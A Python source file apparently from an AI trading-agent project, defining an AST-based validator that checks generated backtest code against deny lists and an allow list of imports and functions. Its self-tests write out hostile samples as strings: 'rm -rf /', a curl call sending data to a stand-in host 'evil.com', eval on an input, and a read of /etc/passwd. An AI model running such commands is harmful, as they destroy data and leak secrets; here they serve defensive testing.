"""
🛡️ Code Validator for Moon Dev RBI Agent
Validates AI-generated Python code before execution to prevent security risks
"""

import ast
from typing import Tuple, List, Set
from termcolor import cprint


class CodeValidator:
    """
    Validates Python code using AST (Abstract Syntax Tree) analysis
    Prevents execution of malicious or dangerous code patterns
    """

    # Absolutely forbidden - dangerous operations
    FORBIDDEN_IMPORTS = {
        'os', 'subprocess', 'sys', 'shutil', 'requests',
        'urllib', 'socket', 'ftplib', 'telnetlib', 'pickle',
        'marshal', 'shelve', 'dbm', 'sqlite3',  # Database access
        'multiprocessing', 'threading',  # Process/thread spawning
        'ctypes', 'cffi',  # Low-level C interface
        '__builtin__', 'builtins',  # Direct builtin access
    }

    # Forbidden functions - code execution & file I/O
    FORBIDDEN_FUNCTIONS = {
        'eval', 'exec', '__import__', 'compile',
        'open', 'file',  # File I/O
        'input', 'raw_input',  # User input
        'exit', 'quit',  # Process termination
        'getattr', 'setattr', 'delattr',  # Dynamic attribute access
        'globals', 'locals', 'vars', 'dir',  # Introspection
    }

    # Allowed imports for backtesting
    ALLOWED_IMPORTS = {
        # Core Python
        'datetime', 'time', 'math', 'decimal', 'fractions',
        'typing', 'dataclasses', 'enum', 'collections',
        'itertools', 'functools', 're',

        # Data analysis & scientific
        'pandas', 'numpy', 'scipy',

        # Trading & backtesting
        'backtesting', 'backtesting.lib', 'backtesting.test',
        'pandas_ta', 'talib', 'ta',

        # Technical indicators libraries
        'pandas_ta.overlap', 'pandas_ta.momentum', 'pandas_ta.trend',
        'pandas_ta.volatility', 'pandas_ta.volume',
    }

    # Allowed pandas_ta sub-imports
    ALLOWED_PANDAS_TA_SUBMODULES = {
        'overlap', 'momentum', 'trend', 'volatility', 'volume',
        'statistics', 'performance', 'cycles', 'candles'
    }

    @classmethod
    def validate(cls, code: str, strict_mode: bool = True) -> Tuple[bool, str]:
        """
        Validate Python code is safe to execute

        Args:
            code: Python source code to validate
            strict_mode: If True, only allows whitelisted imports (default: True)

        Returns:
            Tuple of (is_valid: bool, message: str)

        Example:
            >>> code = "import pandas as pd\\ndf = pd.DataFrame()"
            >>> is_valid, msg = CodeValidator.validate(code)
            >>> print(is_valid)
            True
        """
        # Step 1: Check if code is empty
        if not code or not code.strip():
            return False, "Code is empty"

        # Step 2: Parse code into AST
        try:
            tree = ast.parse(code)
        except SyntaxError as e:
            return False, f"Syntax error on line {e.lineno}: {e.msg}"

        # Step 3: Walk through AST and check for violations
        violations = []

        for node in ast.walk(tree):
            # Check imports
            if isinstance(node, ast.Import):
                for alias in node.names:
                    module_name = alias.name.split('.')[0]  # Get root module

                    # Check forbidden
                    if module_name in cls.FORBIDDEN_IMPORTS:
                        violations.append(f"Forbidden import: {alias.name}")
                        continue

                    # Check allowed (strict mode)
                    if strict_mode:
                        if module_name not in cls.ALLOWED_IMPORTS:
                            # Special case: allow pandas_ta.* imports
                            if not alias.name.startswith('pandas_ta.'):
                                violations.append(f"Unexpected import: {alias.name} (not in whitelist)")

            # Check from imports
            elif isinstance(node, ast.ImportFrom):
                if node.module:
                    module_name = node.module.split('.')[0]

                    # Check forbidden
                    if module_name in cls.FORBIDDEN_IMPORTS:
                        violations.append(f"Forbidden import from: {node.module}")
                        continue

                    # Check allowed (strict mode)
                    if strict_mode:
                        # Allow backtesting.lib and pandas_ta submodules
                        if module_name == 'backtesting':
                            pass  # Always allowed
                        elif module_name == 'pandas_ta':
                            # Check if it's a valid submodule
                            if len(node.module.split('.')) > 1:
                                submodule = node.module.split('.')[1]
                                if submodule not in cls.ALLOWED_PANDAS_TA_SUBMODULES:
                                    violations.append(f"Unknown pandas_ta submodule: {submodule}")
                        elif module_name not in cls.ALLOWED_IMPORTS:
                            violations.append(f"Unexpected from import: {node.module} (not in whitelist)")

            # Check function calls
            elif isinstance(node, ast.Call):
                if isinstance(node.func, ast.Name):
                    func_name = node.func.id
                    if func_name in cls.FORBIDDEN_FUNCTIONS:
                        violations.append(f"Forbidden function call: {func_name}()")

                # Check for dangerous attribute access (e.g., os.system)
                elif isinstance(node.func, ast.Attribute):
                    if node.func.attr in cls.FORBIDDEN_FUNCTIONS:
                        violations.append(f"Forbidden method call: .{node.func.attr}()")

            # Check file operations (with open(...))
            elif isinstance(node, ast.With):
                for item in node.items:
                    if isinstance(item.context_expr, ast.Call):
                        if isinstance(item.context_expr.func, ast.Name):
                            if item.context_expr.func.id == 'open':
                                violations.append("File operations not allowed (with open)")

        # Step 4: Return results
        if violations:
            return False, "Security violations found:\n  - " + "\n  - ".join(violations)

        return True, "✅ Code validated successfully - safe to execute"

    @classmethod
    def validate_and_print(cls, code: str, strict_mode: bool = True) -> bool:
        """
        Validate code and print results (for CLI usage)

        Args:
            code: Python source code to validate
            strict_mode: If True, only allows whitelisted imports

        Returns:
            True if valid, False otherwise
        """
        is_valid, message = cls.validate(code, strict_mode)

        if is_valid:
            cprint(f"✅ {message}", "green")
        else:
            cprint(f"❌ Validation failed!", "red")
            cprint(message, "yellow")

        return is_valid


# Example usage & testing
if __name__ == "__main__":
    print("🛡️ Code Validator Test Suite\n")

    # Test 1: Safe code
    safe_code = """
import pandas as pd
import pandas_ta as ta
from backtesting import Strategy, Backtest

class MyStrategy(Strategy):
    def init(self):
        close = pd.Series(self.data.Close)
        self.sma = self.I(ta.sma, close, length=20)

    def next(self):
        if self.data.Close[-1] > self.sma[-1]:
            self.buy()
        elif self.position and self.data.Close[-1] < self.sma[-1]:
            self.position.close()
"""

    print("Test 1: Safe backtesting code")
    CodeValidator.validate_and_print(safe_code)
    print()

    # Test 2: Dangerous code - os import
    dangerous_code_1 = """
import os
os.system("rm -rf /")  # Very dangerous!
"""

    print("Test 2: Dangerous code (os.system)")
    CodeValidator.validate_and_print(dangerous_code_1)
    print()

    # Test 3: Dangerous code - eval
    dangerous_code_2 = """
import pandas as pd
user_input = "malicious code"
eval(user_input)  # Code injection risk!
"""

    print("Test 3: Dangerous code (eval)")
    CodeValidator.validate_and_print(dangerous_code_2)
    print()

    # Test 4: Dangerous code - subprocess
    dangerous_code_3 = """
import subprocess
subprocess.run(["curl", "http://evil.com/steal_data"])
"""

    print("Test 4: Dangerous code (subprocess)")
    CodeValidator.validate_and_print(dangerous_code_3)
    print()

    # Test 5: File operations
    dangerous_code_4 = """
with open("/etc/passwd", "r") as f:
    data = f.read()
"""

    print("Test 5: Dangerous code (file read)")
    CodeValidator.validate_and_print(dangerous_code_4)
    print()

    print("✅ All tests completed!")
